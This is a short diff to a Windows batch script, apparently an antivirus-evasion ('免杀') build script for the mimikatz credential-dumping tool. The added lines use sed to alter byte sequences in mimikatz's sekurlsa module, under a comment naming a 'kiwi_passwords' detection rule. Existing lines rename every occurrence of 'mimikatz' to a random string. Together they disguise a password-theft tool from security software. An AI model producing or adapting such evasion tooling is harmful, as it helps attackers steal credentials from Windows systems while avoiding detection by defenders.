@@ -4,6 +4,16 @@ setlocal enabledelayedexpansion
 
 set _out=
 
+@rem 单文件修改
+:: kiwi_passwords 规则
+tools\sed -b -i "s/0x33, 0xff, 0x45, 0x89/0x33, 0xff, 0x45, 0x88/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+tools\sed -b -i "s/0x33, 0xff, 0x41, 0x89/0x33, 0xff, 0x41, 0x88/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+tools\sed -b -i "s/0x4c, 0x8b, 0xdf, 0x49/0x4c, 0x8b, 0xdf, 0x48/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+tools\sed -b -i "s/0x89, 0x71, 0x04, 0x89/0x89, 0x71, 0x04, 0x88/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+tools\sed -b -i "s/0x8b, 0x45, 0xf4, 0x89, 0x75/0x8b, 0x45, 0xf4, 0x89, 0x74/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+
+
+
 rem mimikatz文件另外
 call :RandomStr 5
 tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat "mimikatz" . | tools\xargs tools\sed -b -i "s/mimikatz/!_out!/g"
